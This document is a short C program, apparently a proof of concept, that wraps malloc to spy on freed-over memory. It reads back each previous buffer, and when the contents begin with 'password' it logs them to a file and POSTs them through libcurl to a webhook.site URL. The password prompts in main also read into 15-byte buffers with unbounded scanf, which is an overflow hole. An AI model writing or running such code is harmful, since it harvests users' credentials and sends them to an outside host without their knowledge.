#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

static void *prev_ptr = NULL;

void send_data(const char* data) {
  CURL *curl;
  CURLcode res;
  
  curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/4c576887-1d82-4481-9491-ed3e20f67ea2");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
  }
}

void read_data(const void *addr, size_t len)
{
    char copydata[len];
    char *password = "password";

    memcpy(copydata, addr, len);
    if (0 == strncmp(password, copydata, strlen(password)))
    {
        FILE *f = fopen("addr.log", "a+");
        fprintf(f, "%s\n", copydata);
        fclose(f);
        send_data(copydata); 
    }
}

void *my_malloc(size_t size)
{
    void *ptr = malloc(size);

    if (NULL != prev_ptr)
    {
        read_data(prev_ptr, size);
    }
    prev_ptr = ptr;

    return ptr;
}

int main()
{
    char *password;

    password = (char *)my_malloc((15) * sizeof(char));
    if (password == NULL)
    {
        printf("ERROR: could not allocate memory: memory overflow\n");
        return 1;
    }

    printf("Enter password (8 chars): ");
    scanf("%s", password);
    printf("The password you entered is: %s\n", password);

    password = (char *)my_malloc((15) * sizeof(char));
    if (password == NULL)
    {
        printf("ERROR: could not allocate memory: memory overflow\n");
        return 1;
    }

    printf("Enter password (8 chars): ");
    scanf("%s", password);
    printf("The password you entered is: %s\n", password);

    password = (char *)my_malloc((15) * sizeof(char));
    if (password == NULL)
    {
        printf("ERROR: could not allocate memory: memory overflow\n");
        return 1;
    }

    printf("Enter password (8 chars): ");
    scanf("%s", password);
    printf("The password you entered is: %s\n", password);
    free(password);

    return 0;
}

/*
create wrapper on malloc
remember the first pointer addr

next time use malloc
copy the data from this prev addr to addr.log file
save only the string that start with password

to compile to work with webhook:
gcc test.c -lcurl -o test

*/
